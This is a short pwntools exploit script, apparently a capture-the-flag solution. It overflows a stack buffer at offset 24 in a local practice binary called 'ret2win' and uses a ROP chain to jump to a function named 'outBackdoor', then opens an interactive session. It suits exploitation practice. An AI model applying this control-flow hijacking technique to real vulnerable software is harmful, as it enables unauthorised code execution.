from pwn import *

elf = context.binary = ELF("./ret2win")

rop = ROP(elf)
rop.raw(rop.ret)
rop.call(elf.symbols["outBackdoor"])

r = process("./ret2win")

r.recvuntil(b"a song?")

payload = flat({24: rop.chain()})
r.sendline(payload)

r.interactive()

